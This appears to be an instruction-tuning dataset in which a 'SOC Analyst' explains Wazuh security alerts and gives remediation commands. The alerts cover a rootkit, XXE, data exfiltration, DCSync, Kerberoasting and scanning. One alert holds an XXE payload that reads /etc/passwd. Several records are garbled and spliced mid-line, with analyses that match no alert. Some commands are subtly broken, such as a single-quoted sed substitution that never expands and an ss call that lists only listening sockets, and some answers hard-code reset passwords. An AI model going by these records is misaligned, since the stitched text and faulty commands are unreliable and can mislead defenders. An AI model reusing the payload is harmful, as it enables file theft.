input: {"timestamp": "2024-03-17T06:28:33.771Z", "rule": {"id": "40116", "level": 12, "description": "FIM: /etc/ld.so.preload modified (rootkit indicator).", "groups": ["syscheck", "fim", "rootkit"]}, "agent": {"id": "005", "name": "auth-server-01", "ip": "192.168.3.20"}, "syscheck": {"path": "/etc/ld.so.preload", "event": "modified", "md5_after": "1f0e3dad99908345f7439f8ffabdffc4"}, "full_log": "File '/etc/ld.so.preload' created/modified. This is a critical rootkit indicator."}
output:
ALERT ANALYSIS: CRITICAL ROOTKIT INDICATOR - /etc/ld.so.preload was modified on auth-server-01 (192.168.3.20). This file is used to preload shared libraries before any other library, including libc. Attackers use this to hook system calls (hiding files, processes, network connections) — this is the mechanism behind LD_PRELOAD rootkits like Azazel and Jynx2. The entire system's syscall integrity is compromised. Do NOT trust any tools on this system. REMEDIATION: Offline remediation required — boot from clean media.

```bash
# READ the preload file to identify the rootkit library
cat /etc/ld.so.preload
# Remove the preload file
sudo rm -f /etc/ld.so.preload
# Identify and remove the rootkit library listed in the file
# Example: if /lib/libprocesshider.so was listed
sudo rm -f /lib/libprocesshider.so
# Clear the dynamic linker cache
sudo ldconfig
# Scan with rkhunter from a trusted external copy
sudo rkhunter --check --skip-keypress
# Scan with chkrootkit
sudo chkrootkit | grep -v 'not infected'
# Validate all running processes against known binaries
for pid in /proc/[0-9]*; do ls -la $pid/exe 2>/dev/null; done
# This system should be considered fully compromised - begin rebuild from clean image
echo 'RECOMMENDATION: Rebuild this host from a known clean image. Do not trust any output from this OS.'
```

output:
ALERT ANALYSIS: UAC bypass via eventvwr.exe COM hijacking detected on FILE-SERVER-01 (192.168.20.100). input: {"timestamp": "2024-03-17T10:15:27.114Z", "rule": {"id": "60112", "level": 11, "description": "Windows: Token impersonation via SeImpersonatePrivilege.", "groups": ["windows", "privilege_escalation", "token_impersonation"]}, "agent": {"id": "042", "name": "DC-01", "ip": "192.168.100.10"}, "data": {"ProcessName": "C:\\Windows\\Temp\\exploit.exe", "PrivilegeList": "SeImpersonatePrivilege", "TokenType": "Impersonation", "User": "IIS_IUSRS"}, "full_log": "Token impersonation via SeImpersonatePrivilege by IIS_IUSRS running exploit.exe from C:\\Windows\\Temp\\"}

The IIS service account (IIS_IUSRS) is running exploit.exe from C:\Windows\Temp and leveraging SeImpersonatePrivilege to escalate to SYSTEM. Service accounts with SeImpersonatePrivilege are vulnerable to this class of privilege escalation on unpatched systems. On a DC, SYSTEM equals Domain Admin. input: {"timestamp": "2024-03-17T11:30:09.337Z", "rule": {"id": "31801", "level": 10, "description": "Web attack: XXE (XML External Entity) injection attempt.", "groups": ["web", "attack", "xxe"]}, "agent": {"id": "004", "name": "api-server-01", "ip": "192.168.3.55"}, "data": {"srcip": "212.115.115.90", "url": "/api/v1/upload", "method": "POST", "content_type": "application/xml", "status": "200", "body_snippet": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}, "full_log": "XXE injection attempt on /api/v1/upload from 212.115.115.90. Payload reads /etc/passwd. Status 200."}
output:
ALERT ANALYSIS: CRITICAL - XML External Entity (XXE) injection attack on the API server (192.168.3.55) from 212.115.115.90. The payload defines an external entity referencing /etc/passwd and returned HTTP 200. If the XML parser evaluated the entity, the /etc/passwd content was returned to the attacker. XXE can also be used for SSRF and remote code execution in some configurations. REMEDIATION: Block IP, disable XML external entities in the parser, audit API response logs.

```bash
# Block the attacker
sudo ufw deny from 212.115.115.90 to any
# Disable external entity processing in Java (common API framework)
# For Spring/Java XML parser, add to application properties:
echo 'Disable external DTD/entities in your XML parser configuration.'
# For Python lxml:
# parser = etree.XMLParser(resolve_entities=False, no_network=True)
# Check API response logs to see if passwd content was leaked
grep '212.115.115.90' /var/log/nginx/access.log | grep '/api/v1/upload'
# Look for the response body size - if large it may have exfiltrated data
grep '212.115.115.90' /var/log/nginx/access.log | awk '{print $10}'
# Temporarily restrict the upload endpoint
echo 'location /api/v1/upload { allow 192.168.0.0/16; deny all; }' | sudo tee -a /etc/nginx/conf.d/api_restrict.conf
```

output:
ALERT ANALYSIS: CRITICAL - All iptables firewall rules were flushed on the gateway firewall (firewall-gw-01, 192.168.0.1) by root. instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-17T16:25:01.997Z", "rule": {"id": "5104", "level": 12, "description": "Possible data exfiltration: Large outbound data transfer.", "groups": ["network", "data_exfiltration", "anomaly"]}, "agent": {"id": "007", "name": "db-server-02", "ip": "192.168.2.10"}, "data": {"dstip": "91.221.109.155", "dstport": "443", "bytes_out": "4831838208", "bytes_in": "1024", "duration_seconds": "1800", "protocol": "TCP"}, "full_log": "Anomalous outbound transfer: 4.5GB sent to 91.221.109.155:443 over 30 minutes from db-server-02"}
output:
ALERT ANALYSIS: CRITICAL - Active data exfiltration detected from db-server-02 (192.168.2.10). 4.5GB of data was sent to an external IP (91.221.109.155:443) over 30 minutes via HTTPS (port 443 evades many DLP solutions). The asymmetric ratio (4.5GB out, 1KB in) confirms this is outbound exfiltration, not a legitimate backup or sync. The database server is the source, suggesting a full database dump may have been exfiltrated. REMEDIATION: Immediately block the outbound connection, stop the exfiltrating process, and assess data loss.

```bash
# IMMEDIATELY block the destination IP
sudo iptables -A OUTPUT -d 91.221.109.155 -j DROP
sudo ufw deny out to 91.221.109.155
# Find the process responsible for the transfer
sudo lsof -i TCP -n | grep '91.221.109.155'
# Or using ss
ss -tlnp | grep 91.221.109.155
# Kill the exfiltration process once identified
sudo kill -9 <EXFIL_PID>
# Check for mysqldump or pg_dump activity
ps aux | grep -E 'mysqldump|pg_dump|mongodump'
grep -i 'dump\|export\|select.*outfile' /var/log/mysql/mysql.log | tail -30
# Assess what data was sent (check if any dump files exist)
find / -name '*.sql' -o -name '*.dump' -o -name '*.csv' -newer /var/log/syslog 2>/dev/null | head -20
# Preserve evidence
netstat -ano > /var/forensics/connections_exfil.txt
# Rotate all database credentials immediately
mysql -u root -p -e "ALTER USER 'app'@'%' IDENTIFIED BY 'RotatedPass$(openssl rand -hex 8)'"
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-17T18:50:44.112Z", "rule": {"id": "5104", "level": 10, "description": "Suspicious use of tcpdump for packet capture.", "groups": ["rootcheck", "network", "sniffing"]}, "agent": {"id": "002", "name": "dmz-server-01", "ip": "192.168.50.5"}, "data": {"command": "tcpdump -i eth0 -w /tmp/capture.pcap -G 300", "uid": "0", "user": "root"}, "full_log": "Root ran tcpdump packet capture on eth0, writing to /tmp/capture.pcap with 5-minute rotation"}
output:
ALERT ANALYSIS: Unauthorized packet capture detected on dmz-server-01 (192.168.50.5). Root executed tcpdump writing to /tmp/capture.pcap with 5-minute rotation (-G 300), suggesting automated, persistent network sniffing. In a DMZ, this could capture cleartext protocols, session tokens, credentials, and plaintext HTTP traffic transiting the network. No legitimate automated packet capture should be running silently on a DMZ server. REMEDIATION: Kill tcpdump, secure/delete capture file, audit the command origin.

```bash
# Kill the tcpdump process
sudo pkill tcpdump
# Examine and then securely delete the capture file (it may contain credentials)
sudo tcpdump -r /tmp/capture.pcap -c 20 2>/dev/null | head -20
sudo shred -vzn 3 /tmp/capture.pcap
# Check if tcpdump has been running in cron or as a service
crontab -l -u root | grep tcpdump
find /etc/cron.d/ /etc/cron.hourly/ -type f -exec grep -l tcpdump {} \;
# Check bash history for how tcpdump was invoked
cat /root/.bash_history | grep tcpdump
# Restrict tcpdump to root only and remove capabilities if abused
sudo chown root:root /usr/bin/tcpdump
sudo chmod 700 /usr/bin/tcpdump
# Or remove tcpdump entirely if not needed on this server
sudo apt-get remove --purge tcpdump -y
# Audit who has run tcpdump recently
grep 'tcpdump' /var/log/auth.log
```

instruction: You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.
input: {"timestamp": "2024-03-17T20:03:16.779Z", "rule": {"id": "60115", "level": 11, "description": "Windows: DCSync attack detected (domain replication request from non-DC).", "groups": ["windows", "active_directory", "credential_dumping", "dcsync"]}, "agent": {"id": "042", "name": "DC-01", "ip": "192.168.100.10"}, "data": {"EventID": "4662", "ObjectType": "domainDNS", "AccessMask": "0x100", "Properties": "Replicating Directory Changes All", "SubjectUserName": "svc_backup", "SubjectUserDomain": "CORP"}, "full_log": "DCSync attack: svc_backup account requesting 'Replicating Directory Changes All' on DC-01"}
output:
ALERT ANALYSIS: CRITICAL - DCSync attack detected on DC-01 (192.168.100.10). The service account 'svc_backup' requested 'Replicating Directory Changes All' permission on the domain — this is the exact replication permission abused by Mimikatz's DCSync module to pull all password hashes (including krbtgt) from Active Directory without touching LSASS. If successful, the attacker has every domain credential. REMEDIATION: Immediately revoke replication permissions, reset krbtgt, assume full domain compromise.

```powershell
# Identify and remove the dangerous replication permission from svc_backup
# This requires ADSI or AD module on a clean machine
Import-Module ActiveDirectory
# Check current replication permissions
(Get-ACL 'AD:\DC=corp,DC=local').Access | Where-Object { $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }
# Remove the 'Replicating Directory Changes All' right from svc_backup
$acl = Get-ACL 'AD:\DC=corp,DC=local'
$rule = $acl.Access | Where-Object { $_.IdentityReference -match 'svc_backup' }
$acl.RemoveAccessRule($rule)
Set-ACL 'AD:\DC=corp,DC=local' $acl
# Reset the svc_backup account password immediately
Set-ADAccountPassword -Identity svc_backup -Reset -NewPassword (ConvertTo-SecureString 'Rand0mP@ss!2024' -AsPlainText -Force)
# Reset KRBTGT password twice (Golden Ticket mitigation)
# Use Microsoft's Reset-KrbtgtKeyInteractive.ps1 script
# Force reset all privileged account passwords
Get-ADGroupMember 'Domain Admins' | Set-ADUser -ChangePasswordAtLogon $true
```

input: {"timestamp": "2024-03-18T03:19:51.002Z", "rule": {"id": "40119", "level": 10, "description": "Nmap UDP scan detected.", "groups": ["network", "scan", "recon"]}, "agent": {"id": "001", "name": "firewall-gw-01", "ip": "192.168.0.1"}, "data": {"srcip": "89.248.165.60", "protocol": "UDP", "ports_probed": "53,67,68,69,123,161,162,500,514,1900", "packets": "512"}, "full_log": "Nmap UDP scan from 89.248.165.60: probing DNS,DHCP,TFTP,NTP,SNMP,IKE,syslog,SSDP ports on gateway"}
output:
ALERT ANALYSIS: Nmap UDP scan from 89.248.165.60 targeting the gateway (192.168.0.1). The targeted UDP ports reveal the attacker's intent: 53 (DNS amplification/cache poisoning), 161/162 (SNMP — if default community string 'public' is set, full network topology disclosure), 500 (IKE/VPN fingerprinting), 1900 (SSDP/UPnP amplification). SNMP with community string 'public' is the highest risk item here. REMEDIATION: Block the scanner, disable SNMP or rotate community strings, close all non-essential UDP ports.

```bash
# Block the scanner
sudo ufw deny from 89.248.165.60 to any
# Check if SNMP is running with default community string
snmpwalk -v2c -c public 127.0.0.1 2>/dev/null && echo 'DEFAULT SNMP STRING EXPOSED'
# Disable SNMP if not required
sudo systemctl stop snmpd && sudo systemctl disable snmpd
# Or change community string if SNMP is needed
sudo sed -i 's/^rocommunity public/rocommunity $(openssl rand -hex 12)/' /etc/snmp/snmpd.conf
sudo systemctl restart snmpd
# Block UDP ports not needed externally
sudo ufw deny 161/udp
sudo ufw deny 162/udp
sudo ufw deny 1900/udp
sudo ufw deny 69/udp
# Block SSDP/UPnP completely

```

input: {"timestamp": "2024-03-18T05:33:12.881Z", "rule": {"id": "60117", "level": 11, "description": "Windows: Kerberoasting attack detected.", "groups": ["windows", "active_directory", "credential_attack", "kerberoasting"]}, "agent": {"id": "042", "name": "DC-01", "ip": "192.168.100.10"}, "data": {"EventID": "4769", "ServiceName": "MSSQLSvc/sql01.corp.local:1433", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "ClientAddress": "192.168.25.80"}, "full_log": "Kerberoasting: TGS ticket requested for MSSQLSvc with RC4 encryption (0x17) from 192.168.25.80"}
output:
ALERT ANALYSIS: Kerberoasting attack detected on DC-01 (192.168.100.10). A TGS (Ticket Granting Service) ticket was requested for the MSSQLSvc service principal with RC4 encryption (0x17) from 192.168.25.80. RC4 (etype 0x17) tickets are specifically requested by Kerberoasting tools (Rubeus, GetUserSPNs.py) because they can be cracked offline. The attacker is extracting the SQL server service account's password hash for offline cracking. REMEDIATION: Force AES encryption for Kerberos, audit service accounts, rotate SQL service account password.

```powershell
# Identify all service accounts with SPNs (Kerberoastable accounts)
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName, PasswordLastSet, PasswordNeverExpires | Select-Object Name, ServicePrincipalName, PasswordLastSet, PasswordNeverExpires
# Rotate the SQL service account password immediately
Set-ADAccountPassword -Identity svc_mssql -Reset -NewPassword (ConvertTo-SecureString 'C0mpl3xS3rviceP@ss2024!' -AsPlainText -Force)
# Enforce AES256 Kerberos encryption (disables RC4 crackable tickets)
Set-ADUser svc_mssql -KerberosEncryptionType AES256
# Enable Group Managed Service Accounts (gMSA) for auto password rotation
# New-ADServiceAccount -Name 'gmsa_mssql' -DNSHostName sql01.corp.local -PrincipalsAllowedToRetrieveManagedPassword 'Domain Computers'
# Investigate the source IP 192.168.25.80
Resolve-DnsName 192.168.25.80
# Audit all TGS ticket requests with RC4 in last 24hrs
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | Where-Object {$_.Message -match '0x17'} | Select-Object -First 20
```
